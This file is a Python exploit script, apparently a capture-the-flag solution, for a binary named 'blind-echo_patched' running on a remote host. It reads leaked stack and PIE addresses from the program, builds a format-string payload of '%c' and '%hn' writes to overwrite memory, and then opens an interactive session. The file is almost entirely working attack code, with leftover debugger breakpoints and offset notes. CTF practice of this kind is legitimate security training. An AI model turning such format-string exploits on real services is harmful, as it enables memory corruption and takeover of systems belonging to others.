#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit.basic import *
from time import sleep

exe = context.binary = ELF("./blind-echo_patched")
host = args.HOST or "35.205.244.111"
port = int(args.PORT or 1337)

gdbscript = """
brva 0x13b7
tbreak main
continue
# b *0x7ffff7e4dd44
# b *0x7ffff7fe01cd
""".format(
    **locals()
)


libc = SetupLibcELF()
io = start()

leaks = GetInt(rl())
stack_leak = leaks[0]
pie_leak = leaks[1]
idk = 0x18
print(hex(stack_leak & 0xFF00))
print(hex(stack_leak), hex(pie_leak))

payload = ""
payload += f"%{stack_leak}c%10$hn"
payload += f"%{stack_leak+0x2308}c%26$hn"
# payload += f"%{pie_leak+0x50da-0x4080+(8*100)}c%27$hn"
payload += f"%{pie_leak-0xc480+8}c%27$hn"

sl(payload.ljust(128, "A"))

io.interactive()

"""
%100c%5$n
%1c%5$n

File (Base) 0x5555555552be = 0x555555554000 + 0x12be
"""
